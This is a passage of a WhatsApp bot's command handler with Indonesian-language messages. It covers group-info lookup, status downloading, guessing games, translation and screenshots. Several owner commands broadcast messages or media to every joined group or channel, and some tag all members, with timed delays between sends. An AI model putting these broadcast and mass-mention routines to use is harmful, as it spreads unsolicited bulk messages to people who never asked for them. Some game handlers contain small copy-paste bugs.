                                        {
                                            name: "cta_copy",
                                            buttonParamsJson: JSON.stringify({
                                                display_text: "📋 Copy ID Group",
                                                copy_code: groupId
                                            })
                                        },
                                        {
                                            name: "cta_copy",
                                            buttonParamsJson: JSON.stringify({
                                                display_text: "📋 Copy Group Name",
                                                copy_code: res.subject
                                            })
                                        }
                                    ], 
                                },
                            },
                        }, 
                    }, 
                },{ quoted : m });
                await sleep(1500)
                await sock.relayMessage( Msg.key.remoteJid, Msg.message,{ messageId: Msg.key.id })
            } catch (e) {
              m.reply("❌Gagal mengambil data group")
            }
        }
        break
        //═══════════════════════════════════//
        case "swdl": case "getsw": {
            if (!isBot && !isDeveloper) return;
            
            if (!m.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
                return sock.sendMessage(from, { text: "Reply ke status (story) yang ingin kamu download!" }, { quoted: m });
            }
          
            const quoted = m.message.extendedTextMessage.contextInfo.quotedMessage;
           
            let mediaType = null;
            let mediaMessage = null;
            await reaction(m.chat, "♠️")
            if (quoted.imageMessage) {
                mediaType = "image";
                mediaMessage = quoted.imageMessage;
            } else if (quoted.videoMessage) {
                mediaType = "video";
                mediaMessage = quoted.videoMessage;
            } else {
                return sock.sendMessage(from, { text: "Story yang direply bukan gambar atau video." }, { quoted: m });
            }
          
            try {
                const stream = await downloadContentFromMessage(mediaMessage, mediaType);
                let buffer = Buffer.from([]);
              
                for await (const chunk of stream) {
                    buffer = Buffer.concat([buffer, chunk]);
                }
              
                await sock.sendMessage(from, {
                    [mediaType]: buffer,
                    caption: "Berhasil mendownload story!"
                }, { quoted: m });
          
            } catch (err) {
                console.error("Gagal download story:", err);
                await sock.sendMessage(from, { text: "Terjadi kesalahan saat download story." }, { quoted: m });
            }
        }
        break
        //═════════════════════════════════//
        case "swgrup": case "sw": {
            if (!isOwner && !isDeveloper) return
            const quoted = m.quoted ? m.quoted : m;
            const mime = (quoted.msg || quoted).mimetype || "";
            const regex = new RegExp(`^\\${prefix}${command}\\s*`, "i");
            const caption = m.body.replace(regex, "").trim();
            const jid = m.chat;
            await reaction(m.chat, "♠️")
            if (/image/.test(mime)) {
                const buffer = await quoted.download();
                    await sock.sendMessage(jid, {
                        groupStatusMessage: {
                            image: buffer,
                            caption
                        }
                    });
            } else if (/video/.test(mime)) {
                const buffer = await quoted.download();
                    await sock.sendMessage(jid, {
                        groupStatusMessage: {
                            video: buffer,
                            caption
                        }
                    });
            } else if (/audio/.test(mime)) {
                const buffer = await quoted.download();
                await sock.sendMessage(jid, {
                    groupStatusMessage: {
                        audio: buffer
                    }
                });
            } else if (caption) {
                await sock.sendMessage(jid, {
                    groupStatusMessage: {
                        text: caption
                    }
                });
            } else {
                await reply(`Tolong reply media atau tambahkan teks.\nexample: ${prefix + command} (reply image/video/audio) hai ini saya`);
            }
        }
        break;
        //═════════════════════════════════//
        case "swgrup2":
        case "sw2": {
            if (!isOwner && !isDeveloper) return;
        
            await sock.sendMessage(m.chat, {
                react: {
                    text: "♠️",
                    key: m.key
                }
            });
        
            const quoted = m.quoted ? m.quoted : m;
            const mime = (quoted.msg || quoted).mimetype || "";
        
            const regex = new RegExp(`^\\${prefix}${command}\\s*`, "i");
            const argsText = m.body.replace(regex, "").trim();
        
            let parts = argsText.split("|");
        
            let groupCandidates = parts.filter(v =>
                v.includes("@g.us") || v.endsWith("g.us")
            );
        
            let caption = parts
                .filter(v => !v.includes("@g.us"))
                .join(" ")
                .trim();
        
            let groupIds = [];
        
            if (groupCandidates.length > 0) {
                groupCandidates = groupCandidates
                    .join(" ")
                    .split(",")
                    .map(v => v.trim())
                    .filter(Boolean);
        
                groupIds.push(...groupCandidates);
            } else {
                groupIds.push(m.chat);
        
                if (!caption) {
                    caption = argsText;
                }
            }
        
            if (!groupIds.length) {
                return reply("⚠️ Tidak ada ID grup ditemukan.");
            }
        
            const total = groupIds.length;
            let sent = 0;
        
            const spinner = [
                "⠋","⠙","⠹","⠸","⠼",
                "⠴","⠦","⠧","⠇","⠏"
            ];
        
            let spinIndex = 0;
        
            function makeBar(percent) {
                const size = 20;
                const filled = Math.floor((percent / 100) * size);
        
                return "█".repeat(filled) + "░".repeat(size - filled);
            }
        
            const progressMsg = await sock.sendMessage(m.chat, {
                text:
                    `📡 *GROUP BROADCAST TERMINAL*\n\n` +
                    `⚙️ Status : Initializing...\n` +
                    `📊 Target : ${total} Grup\n\n` +
                    `[░░░░░░░░░░░░░░░░░░] 0%`
            });
        
            for (const gid of groupIds) {
                try {
        
                    if (/image/.test(mime)) {
                        const buffer = await quoted.download();
        
                        await sock.sendMessage(gid, {
                            groupStatusMessage: {
                                image: buffer,
                                caption: caption || ""
                            }
                        });
                    }
        
                    else if (/video/.test(mime)) {
                        const buffer = await quoted.download();
        
                        await sock.sendMessage(gid, {
                            groupStatusMessage: {
                                video: buffer,
                                caption: caption || ""
                            }
                        });
                    }
        
                    else if (/audio/.test(mime)) {
                        const buffer = await quoted.download();
        
                        await sock.sendMessage(gid, {
                            groupStatusMessage: {
                                audio: buffer
                            }
                        });
                    }
        
                    else if (caption) {
                        await sock.sendMessage(gid, {
                            groupStatusMessage: {
                                text: caption
                            }
                        });
                    }
        
                    sent++;
        
                    const percent = Math.floor((sent / total) * 100);
                    const bar = makeBar(percent);
        
                    const spin = spinner[spinIndex % spinner.length];
                    spinIndex++;
        
                    await sock.relayMessage(
                        m.chat,
                        {
                            protocolMessage: {
                                key: progressMsg.key,
                                type: 14,
                                editedMessage: {
                                    conversation:
                                        `📡 *GROUP BROADCAST TERMINAL*\n\n` +
                                        `⚙️ Status : Sending ${spin}\n` +
                                        `📊 Progress : ${sent}/${total} Grup\n\n` +
                                        `[${bar}] ${percent}%`
                                }
                            }
                        },
                        {}
                    );
        
                    await sleep(5000);
        
                } catch (err) {
                    console.log(`[❌] ${gid}`, err);
                }
            }
        
            await sock.relayMessage(m.chat, {
                protocolMessage: {
                    key: progressMsg.key,
                    type: 14,
                    editedMessage: {
                        conversation:
                            `✅ *BROADCAST COMPLETE*\n\n` +
                            `📊 Total Grup : ${total}\n` +
                            `📨 Terkirim : ${sent}\n` +
                            `❌ Gagal : ${total - sent}\n\n` +
                            `🚀 Broadcast selesai.`
                    }
                }
            }, {});
        }
        break;
        //═════════════════════════════════//
        case 'bljpm': case 'blokjpm': case 'blockjpm': {
            if (!m.isGroup) return reply(msg.group)
            if (!isOwner) return reply(msg.owner)
        
            let text = q?.toLowerCase()
            if (!text || !['on','off'].includes(text))
                return reply(`${noticenya}\n${prefix + command} on\n${prefix + command} off`)
            
            let blockJpm = getBlockJpm()
            let groupId = m.chat
        
            if (text === 'on') {
                if (blockJpm.includes(groupId))
                    return reply('⚠️ bljpm sudah aktif di grup ini')
        
                blockJpm.push(groupId)
                fs.writeFileSync(bljpmPath, JSON.stringify(blockJpm, null, 2))
        
                return reply(`Berhasil menyalakan block jpm pada group ini!`)
            }
        
            if (text === 'off') {
                if (!blockJpm.includes(groupId))
                    return reply('⚠️ bljpm belum aktif di grup ini')
        
                blockJpm = blockJpm.filter(id => id !== groupId)
                fs.writeFileSync(bljpmPath, JSON.stringify(blockJpm, null, 2))
        
                return reply(`Berhasil mematikan block jpm pada group ini!`)
            }
        }
        break
        //═══════════════════════════════════//
        case 'jpm': case 'jpmg': case 'jpmgrup': case 'jpmgroup': case "jpmgc": {
            if (!isOwner) return reply("❌ Khusus owner!");
        
            if (!text && !m.quoted) {
                return reply(`Contoh:
        .jpmgc Halo semua!
        Reply media lalu ketik .jpmgc Promo terbaru`);
            }
        
            const delay = ms => new Promise(res => setTimeout(res, ms));
        
            const groupsObj = await sock.groupFetchAllParticipating();
            const groups = Object.values(groupsObj).map(g => g.id);
        
            if (!groups.length) return reply("Bot tidak berada di grup manapun.");
        
            let mime = m.quoted?.mimetype || m.quoted?.msg?.mimetype || "";
            let media = m.quoted ? await m.quoted.download() : null;
        
            const total = groups.length;
        
            const sentMsg = await sock.sendMessage(m.chat, {
                text:
                `📡 *JPM GROUP SENDING*\n\n` +
                `📊 Total Grup : ${total}\n` +
                `⚙️ Status     : Initializing...\n\n` +
                `[░░░░░░░░░░░░░░░░░░] 0%`
            }, { quoted: m });
        
            let success = 0;
            let failed = 0;
            let lastPercent = -1;
        
            const spinner = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"];
            let spinIndex = 0;
        
            for (let i = 0; i < total; i++) {
                try {
                    let jid = groups[i];
        
                    if (media) {
                        if (/image/.test(mime)) {
                            await sock.sendMessage(jid, {
                                image: media,
                                caption: text || ""
                            });
                        } else if (/video/.test(mime)) {
                            await sock.sendMessage(jid, {
                                video: media,
                                caption: text || ""
                            });
                        } else if (/audio/.test(mime)) {
                            await sock.sendMessage(jid, {
                                audio: media,
                                mimetype: "audio/mpeg",
                                ptt: false
                            });
                        }
                    } else {
                        await sock.sendMessage(jid, {
                            text: text || m.quoted?.text || ""
                        });
                    }
        
                    success++;
                } catch (err) {
                    failed++;
                }
        
                const percent = Math.floor(((i + 1) / total) * 100);
        
                if (percent !== lastPercent) {
                    lastPercent = percent;
        
                    const barLength = 20;
                    const filled = Math.round((percent / 100) * barLength);
                    const bar = "█".repeat(filled) + "░".repeat(barLength - filled);
        
                    const spin = spinner[spinIndex++ % spinner.length];
        
                    await sock.sendMessage(m.chat, {
                        text:
                        `📡 *JPM GROUP SENDING*\n\n` +
                        `📊 Total Grup : ${total}\n` +
                        `⚙️ Status     : Sending ${spin}\n` +
                        `📨 Progress   : ${i + 1}/${total}\n` +
                        `✔ Success    : ${success}\n` +
                        `✖ Failed     : ${failed}\n\n` +
                        `[${bar}] ${percent}%`,
                        edit: sentMsg.key
                    });
                }
        
                await delay(6000);
            }
        
            await sock.sendMessage(m.chat, {
                text:
                `✅ *JPM GROUP COMPLETE*\n\n` +
                `📊 Total Grup : ${total}\n` +
                `✔ Success    : ${success}\n` +
                `✖ Failed     : ${failed}\n` +
                `📈 Rate      : ${((success / total) * 100).toFixed(2)}%`,
                edit: sentMsg.key
            });
        }
        break;
        //═══════════════════════════════════//
        case "jpmhidetag":
        case "jpmht": {
            if (!isOwner) return reply("❌ Khusus owner!");
        
            if (!text && !m.quoted) {
                return reply(`Contoh:
        .jpmhidetag Pengumuman penting!
        Reply media lalu ketik .jpmhidetag Promo terbaru`);
            }
        
            const delay = ms => new Promise(res => setTimeout(res, ms));
        
            const groupsObj = await sock.groupFetchAllParticipating();
            const groups = Object.values(groupsObj).map(g => g.id);
        
            if (!groups.length) return reply("Bot tidak berada di grup manapun.");
        
            let mime = m.quoted?.mimetype || m.quoted?.msg?.mimetype || "";
            let media = m.quoted ? await m.quoted.download() : null;
        
            const total = groups.length;
        
            const sentMsg = await sock.sendMessage(m.chat, {
                text:
                `📡 *JPM HIDETAG SENDING*\n\n` +
                `📊 Total Grup : ${total}\n` +
                `⚙️ Status     : Initializing...\n\n` +
                `[░░░░░░░░░░░░░░░░░░] 0%`
            }, { quoted: m });
        
            let success = 0;
            let failed = 0;
            let lastPercent = -1;
        
            const spinner = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"];
            let spinIndex = 0;
        
            for (let i = 0; i < total; i++) {
                try {
                    let jid = groups[i];
                    let metadata = await sock.groupMetadata(jid);
                    let mentions = metadata.participants.map(p => p.id);
        
                    if (media) {
                        if (/image/.test(mime)) {
                            await sock.sendMessage(jid, {
                                image: media,
                                caption: text || "",
                                mentions
                            });
                        } else if (/video/.test(mime)) {
                            await sock.sendMessage(jid, {
                                video: media,
                                caption: text || "",
                                mentions
                            });
                        } else if (/audio/.test(mime)) {
                            await sock.sendMessage(jid, {
                                audio: media,
                                mimetype: "audio/mpeg",
                                ptt: false,
                                mentions
                            });
                        }
                    } else {
                        await sock.sendMessage(jid, {
                            text: text || m.quoted?.text || "",
                            mentions
                        });
                    }
        
                    success++;
                } catch (err) {
                    failed++;
                }
        
                const percent = Math.floor(((i + 1) / total) * 100);
        
                if (percent !== lastPercent) {
                    lastPercent = percent;
        
                    const barLength = 20;
                    const filled = Math.round((percent / 100) * barLength);
                    const bar = "█".repeat(filled) + "░".repeat(barLength - filled);
        
                    const spin = spinner[spinIndex++ % spinner.length];
        
                    await sock.sendMessage(m.chat, {
                        text:
                        `📡 *JPM HIDETAG SENDING*\n\n` +
                        `📊 Total Grup : ${total}\n` +
                        `⚙️ Status     : Sending ${spin}\n` +
                        `📨 Progress   : ${i + 1}/${total}\n` +
                        `✔ Success    : ${success}\n` +
                        `✖ Failed     : ${failed}\n\n` +
                        `[${bar}] ${percent}%`,
                        edit: sentMsg.key
                    });
                }
        
                await delay(6000);
            }
            await sock.sendMessage(m.chat, {
                text:
                `✅ *JPM HIDETAG COMPLETE*\n\n` +
                `📊 Total Grup : ${total}\n` +
                `✔ Success    : ${success}\n` +
                `✖ Failed     : ${failed}\n` +
                `📈 Rate      : ${((success / total) * 100).toFixed(2)}%`,
                edit: sentMsg.key
            });
        }
        break;
        //═══════════════════════════════════//
        case 'addch': {
            if (!isOwner) return reply(msg.owner)
            if (!text) return reply('Masukkan Newsletter ID')
        
            let db = getNewsletter()
            let id = text.trim()
        
            if (db.includes(id)) return reply('⚠️ Newsletter sudah terdaftar')
        
            db.push(id)
            saveNewsletter(db)
        
            reply(`✅ Newsletter berhasil ditambahkan\n\nID:\n${id}`)
        }
        break
        //═══════════════════════════════════//
        case 'delch': {
            if (!isOwner) return reply(msg.owner)
            if (!text) return reply('Masukkan Newsletter ID')
        
            let db = getNewsletter()
            let id = text.trim()
        
            if (!db.includes(id)) return reply('❌ Newsletter tidak ditemukan')
        
            db = db.filter(v => v !== id)
            saveNewsletter(db)
        
            reply(`🗑️ Newsletter berhasil dihapus\n\nID:\n${id}`)
        }
        break
        //═══════════════════════════════════//
        case 'listch': {
            if (!isOwner) return reply(msg.owner)
        
            let db = getNewsletter()
            if (db.length < 1) return reply('📭 Belum ada newsletter')
        
            let teks = `📢 *LIST NEWSLETTER*\n\n`
            db.forEach((id, i) => {
                teks += `${i + 1}. ${id}\n`
            })
        
            reply(teks)
        }
        break
        //═══════════════════════════════════//
        case 'jpmch': {
            if (!isOwner) return reply(msg.owner)
        
            let sub = q?.split(' ')[0]?.toLowerCase()
            let arg = q?.slice(sub?.length + 1)
            let channelJpm = getNewsletter()
            
            // ADD
            if (sub === 'add') {
                if (!arg) return reply('Contoh:\n.jpmch add 1203630xxx@newsletter')
                if (!arg.endsWith('@newsletter'))
                    return reply('❌ Harus @newsletter')
        
                if (channelJpm.includes(arg))
                    return reply('⚠️ Channel sudah ada')
        
                channelJpm.push(arg)
                saveNewsletter(channelJpm)
                return reply(`✅ Channel ditambahkan\n${arg}`)
            }
        
            // DEL
            if (sub === 'del') {
                if (!arg) return reply('Contoh:\n.jpmch del 1203630xxx@newsletter')
                if (!channelJpm.includes(arg))
                    return reply('⚠️ Channel tidak ada')
        
                channelJpm = channelJpm.filter(v => v !== arg)
                saveNewsletter(channelJpm)
                return reply(`✅ Channel dihapus\n${arg}`)
            }
        
            // LIST
            if (sub === 'list') {
                if (!channelJpm.length)
                    return reply('📭 Database channel kosong')
        
                return reply(`📣 LIST CHANNEL JPM\n\n` +
                    channelJpm.map((v,i)=>`${i+1}. ${v}`).join('\n')
                )
            }
        
            // ===== SEND JPM =====
            if (!channelJpm.length)
                return reply('📭 Tidak ada channel di database')
        
            let teks = arg || m.quoted?.text || ''
            let quoted = m.quoted
            let media = null
            let type = null
        
            if (quoted?.mtype) {
                type = quoted.mtype
                if (type.includes('image') ||
                    type.includes('video') ||
                    type.includes('audio') ||
                    type.includes('document')) {
                    media = await quoted.download()
                }
            }
        
            if (!teks && !media)
                return reply(`❌ Gunakan: ${prefix}jpmch send teks atau reply media / teks`)
        
            let sukses = 0, gagal = 0
            
            await reaction(m.chat, "💨")
            await sleep(1000)
            reply(`📣 JPM CHANNEL dimulai...\nTotal: ${channelJpm.length}`)
        
            for (let ch of channelJpm) {
                try {
                    let msg = {}
        
                    if (media) {
                        if (type.includes('image')) msg.image = media
                        if (type.includes('video')) msg.video = media
                        if (type.includes('audio')) msg.audio = media
                        if (type.includes('document')) msg.document = media
                        if (teks) msg.caption = teks
                    } else {
                        msg.text = teks
                    }
        
                    await sock.sendMessage(ch, msg)
                    sukses++
                    await delay(5000)
                } catch (e) {
                    gagal++
                }
            }
        
            reply(`✅ JPM CHANNEL SELESAI\n✔️ Sukses : ${sukses}\n❌ Gagal : ${gagal}`)
        }
        break
        //═══════════════════════════════════//
        case 'send-chat': case 's-chat': {
            if (!isOwner) return reply(msg.owner)
        
            if (!q) return reply(`${noticenya}\n${prefix + command} 1234@g.us,12345@g.us Halo semua`)
        
            // pisahkan id grup & teks
            let split = q.split(' ')
            let idPart = split[0]
            let text = split.slice(1).join(' ')
        
            let groupIds = idPart
                .split(',')
                .map(v => v.trim())
                .filter(v => v.endsWith('@g.us'))
        
            if (!groupIds.length)
                return reply('❌ ID grup tidak valid')
        
            // DETEKSI REPLY
            let quoted = m.quoted
            let mime = quoted?.mimetype || ''
            let media = quoted ? await quoted.download() : null
        
            let sukses = 0
            let gagal = 0
        
            for (let gid of groupIds) {
                try {
                    let meta = await sock.groupMetadata(gid)
                    let members = meta.participants.map(v => v.id)
        
                    let msg = {}
        
                    if (quoted) {
                        if (/image/.test(mime)) {
                            msg = {
                                image: media,
                                caption: text || quoted.caption || '',
                                mentions: members
                            }
                        } else if (/video/.test(mime)) {
                            msg = {
                                video: media,
                                caption: text || quoted.caption || '',
                                mentions: members
                            }
                        } else if (/audio/.test(mime)) {
                            msg = {
                                audio: media,
                                mimetype: quoted.mimetype,
                                mentions: members
                            }
                        } else if (/sticker/.test(mime)) {
                            msg = {
                                sticker: media,
                                mentions: members
                            }
                        } else {
                            // document
                            msg = {
                                document: media,
                                mimetype: quoted.mimetype,
                                fileName: quoted.fileName || 'file',
                                caption: text || '',
                                mentions: members
                            }
                        }
                    } else {
                        if (!text) return reply('❌ Teks tidak boleh kosong')
                        msg = {
                            text,
                            mentions: members
                        }
                    }
        
                    await sock.sendMessage(gid, msg)
                    sukses++
                    await sleep(5000)
        
                } catch (e) {
                    gagal++
                    console.log(`Gagal kirim ke ${gid}`, e)
                }
            }
        
            await reaction(m.chat, "✅")
        }
        break
        //═══════════════════════════════════//
        // GAMES MENU
        //═══════════════════════════════════//
        case 'tebakkata': {
            if (!isGroup) return reply(msg.group)
            var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./Data/Games/tebakkata.json')));
            console.log('Jawaban : '+jawaban)
            await reply(`*GAME TEBAK KATA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
            tebakkata = {
            soal: soal,
            jawaban: jawaban.toLowerCase(),
            waktu: setTimeout(function () {
            if (tebakkata) reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
            delete tebakkata
            }, gamewaktu * 1000)
            }
        }
        break 
        //═══════════════════════════════════//
        case 'asahotak': {
            if (!isGroup) return reply(msg.group)
            var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./Data/Games/asahotak.json')));
            console.log('Jawaban : '+jawaban)
            await reply(`*GAME ASAH OTAK*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
            asahotak = {
            soal: soal,
            jawaban: jawaban.toLowerCase(),
            waktu: setTimeout(function () {
            if (asahotak) reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
            delete asahotak
            }, gamewaktu * 1000)
            }
        }
        break
        //═══════════════════════════════════//
        case 'susunkata': {
            if (!isGroup) return reply(msg.group)
            var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./Data/Games/susunkata.json')));
            console.log('Jawaban : '+jawaban)
            await reply(`*GAME SUSUN KATA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
            susunkata = {
            soal: soal,
            jawaban: jawaban.toLowerCase(),
            waktu: setTimeout(function () {
            if (asahotak) reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
            delete susunkata
            }, gamewaktu * 1000)
            }
        }
        break
        //═══════════════════════════════════//
        case 'tebakgambar': {
            if (!isGroup) return reply(msg.group)
            var { img, jawaban, deskripsi } = pickRandom(JSON.parse(fs.readFileSync('./Data/Games/tebakgambar.json')));
            console.log('Jawaban : '+jawaban)
            var teks1 = `*GAME TEBAK GAMBAR*\n\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nDeskripsi: ${deskripsi}\nWaktu: ${gamewaktu} detik`
            await sock.sendMessage(from, {image: {url: img}, caption: teks1}, {quoted: m})
            tebakgambar = {
                soal: img,
                jawaban: jawaban.toLowerCase(),
                waktu: setTimeout(function () {
                if (tebakgambar) reply(`Waktu habis!\nJawabannya adalah: ${tebakgambar2[from].jawaban}`);
                delete tebakgambar
                }, gamewaktu * 1000)
            }
        }
        break
        //═══════════════════════════════════//
        case 'tebakbendera': {
            if (!isGroup) return reply(msg.group)
            var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./Data/Games/tebakbendera.json')));
            console.log('Jawaban : '+jawaban)
            await reply(`*GAME TEBAK BENDERA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
            tebakbendera = {
                soal: soal,
                jawaban: jawaban.toLowerCase(),
                waktu: setTimeout(function () {
                if (tebakbendera[from]) reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
                delete tebakbendera
                }, gamewaktu * 1000)
            }
        }
        break
        //═══════════════════════════════════//
        case 'tebakkimia': {
            if (!isGroup) return reply(msg.group)
            var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./Data/Games/tebakkimia.json')));
            console.log('Jawaban : '+jawaban)
            await reply(`*GAME ASAH OTAK*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
            tebakkimia = {
                soal: soal,
                jawaban: jawaban.toLowerCase(),
                waktu: setTimeout(function () {
                if (asahotak) reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
                delete tebakkimia
                }, gamewaktu * 1000)
            }
        }
        break
        //═══════════════════════════════════//
        case 'family100': case 'f100': {
            if (!isGroup) return reply(msg.group)
            var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./Data/Games/family100.json')));
            console.log('Jawaban : '+jawaban)
            let famil = []
            for (let i of jawaban){
            let fefsh = i.split('/') ? i.split('/')[0] : i
            let iuhbs = fefsh.startsWith(' ') ? fefsh.replace(' ','') : fefsh
            let axsfh = iuhbs.endsWith(' ') ? iuhbs.replace(iuhbs.slice(-1), '') : iuhbs
            famil.push(axsfh.toLowerCase())
            }
            await reply(`*GAME FAMILY 100*\n\nSoal: ${soal}\nTotal Jawaban: ${jawaban.length}\n\nWaktu: ${gamewaktu} detik`)
            family = {
                soal: soal,
                jawaban: famil,
                waktu: setTimeout(async function () {
                if (global.family) {
                    let teks = `*WAKTU HABIS!*\nJawaban yang belum terjawab :\n\n`
                    let jwb = family.jawaban
                    for (let i of jwb){teks += `\n${i}`}
                    reply(teks)
                    delete family
                    };
                }, gamewaktu * 1000)
            }
        }
        break
        //═══════════════════════════════════//
        // OTHER MENU
        //═══════════════════════════════════//
        case "tr":
        case "translate": {
            const translate = require("translate-google-api");
            const defaultLang = "en";
            const langList = `
🌐 *DAFTAR KODE BAHASA (LANGUAGE CODES)*

🔤 Bahasa Populer
• id — Indonesian (Bahasa Indonesia)
• en — English (Inggris)
• es — Spanish (Spanyol)
• fr — French (Prancis)
• de — German (Jerman)
• it — Italian (Italia)
• pt — Portuguese (Portugis)
• ru — Russian (Rusia)
• ja — Japanese (Jepang)
• ko — Korean (Korea)
• zh-cn — Chinese Simplified (Mandarin Sederhana)
• zh-tw — Chinese Traditional (Mandarin Tradisional)
• ar — Arabic (Arab)
• hi — Hindi
• th — Thai
• vi — Vietnamese
• tr — Turkish (Turki)
• nl — Dutch (Belanda)
• pl — Polish (Polandia)
• sv — Swedish (Swedia)
• fi — Finnish (Finlandia)
• no — Norwegian (Norwegia)
• da — Danish (Denmark)

🌏 Bahasa Asia Lainnya
• ms — Malay (Melayu)
• tl — Filipino (Tagalog)
• bn — Bengali
• ur — Urdu
• ta — Tamil
• te — Telugu
• ml — Malayalam
• kn — Kannada
• si — Sinhala
• km — Khmer
• lo — Lao
• my — Burmese (Myanmar)
• ne — Nepali
• mn — Mongolian

🌍 Bahasa Eropa Tambahan
• cs — Czech
• sk — Slovak
• hu — Hungarian
• ro — Romanian
• bg — Bulgarian
• uk — Ukrainian
• el — Greek
• sr — Serbian
• hr — Croatian
• lt — Lithuanian
• lv — Latvian
• et — Estonian
• sl — Slovenian
• mt — Maltese
• ga — Irish
• cy — Welsh
• is — Icelandic
• sq — Albanian
• mk — Macedonian
• eu — Basque
• ca — Catalan
• gl — Galician

🌍 Bahasa Afrika
• sw — Swahili
• zu — Zulu
• xh — Xhosa
• af — Afrikaans
• am — Amharic
• yo — Yoruba
• ig — Igbo
• ha — Hausa
• so — Somali

📌 Contoh Penggunaan:
• .tr id good night
• .tr en selamat pagi
• .tr ja aku lapar
• .tr ko aku cinta kamu

Balas pesan dengan:
• .tr en
untuk menerjemahkan pesan yang dikutip.
`;
        
            if (!text && !m.quoted) {
                return reply(example("id good night"));
            }
        
            let language = args[0];
            let teks;
        
            if (!language) {
                return reply(example("id good night"));
            }
            
            if (args[0] === "lang") {
                return reply(langList);
            }
        
            // Jika menggunakan quoted message
            if (m.quoted) {
                if (!m.quoted.text) {
                    return reply("Pesan yang dikutip tidak memiliki teks.");
                }
                teks = m.quoted.text;
            } 
            // Jika teks diketik langsung
            else {
                if (args.length < 2) {
                    return reply(example("id good night"));
                }
                teks = args.slice(1).join(" ");
            }
        
            try {
                const result = await translate(teks, { to: language });
                m.reply(result[0]);
            } catch (err) {
                try {
                    const fallback = await translate(teks, { to: defaultLang });
                    reply(fallback[0]);
                } catch {
                    m.reply("Terjadi kesalahan saat menerjemahkan teks.");
                }
            }
        }
        break;
        //═══════════════════════════════════//
        case "ssweb": {
            if (!text) return reply(`Contoh:\n${prefix + command} https://example.com`)
        
            try {
                await sock.sendMessage(m.chat, { react: { text: '📸', key: m.key } })
        
                let url = text.startsWith('http') ? text : 'https://' + text
        
                // Pakai API alternatif + delay render
                let api = `https://api.screenshotmachine.com?key=free&url=${encodeURIComponent(url)}&dimension=1366xfull&delay=5000`
        
                await sock.sendMessage(m.chat, {
                    image: { url: api },
                    caption: `📸 *Screenshot Website*\n\n🌐 ${url}`
                }, { quoted: m })
        
            } catch (err) {
                console.log(err)
                reply("Gagal mengambil screenshot 😵")
            }
        }
        break
        //═══════════════════════════════════//
        case "tofileconfirm": {
            if (!args[0] || !args[1]) 
                return reply(`❌ Format salah!\nContoh: ${prefix + command} namafile txt`)
        
            let fileName = args[0].replace(/[^a-zA-Z0-9]/g, "")
            let format = args[1].toLowerCase()
        
            if (!global.tofileBufferMap || !global.tofileBufferMap.has(m.sender))
                return reply("❌ Data teks tidak ditemukan. Kirim ulang teksnya.")
        
            const allowed = ["txt", "js", "html", "pdf", "json", "py", "php", "md"]
            if (!allowed.includes(format))
                return reply("❌ Format tidak didukung.")
        
            try {
                await sock.sendMessage(m.chat, { react: { text: "📦", key: m.key } })
        
                let data = global.tofileBufferMap.get(m.sender)
                let buffer = data.buffer
        
                // kalau PDF, convert simple text ke PDF basic
                if (format === "pdf") {
                    const PDFDocument = require("pdfkit")
                    const doc = new PDFDocument()
                    const chunks = []
        
                    doc.on("data", chunk => chunks.push(chunk))
                    doc.on("end", async () => {
                        const pdfBuffer = Buffer.concat(chunks)
        
                        await sock.sendMessage(m.chat, {
                            document: pdfBuffer,
                            mimetype: "application/pdf",
                            fileName: `${fileName}.pdf`
                        }, { quoted: m })
        
                        global.tofileBufferMap.delete(m.sender)
                    })
        
                    doc.text(buffer.toString("utf-8"))
                    doc.end()
                    return
                }
        
                // selain PDF langsung kirim buffer biasa
                await sock.sendMessage(m.chat, {
                    document: buffer,
                    mimetype: "application/octet-stream",
                    fileName: `${fileName}.${format}`
                }, { quoted: m })
        
                global.tofileBufferMap.delete(m.sender)
        
            } catch (err) {
                console.error(err)
                reply("❌ Gagal mengirim file.")
            }
        }
        break;
        //═══════════════════════════════════//
        case "tofile": {
            let teksToConvert = m.quoted ? (m.quoted.text || m.quoted.caption) : text
            if (!teksToConvert) return reply(`❌ Kirim teks atau reply teks yang ingin dijadikan file!\n\n*Contoh:* ${prefix + command} namafile`)
    
            let inputName = m.quoted ? (text || "file") : (text || "file")
            inputName = inputName.split(" ")[0].replace(/[^a-zA-Z0-9]/g, "") 
    
            try {
                await sock.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
    
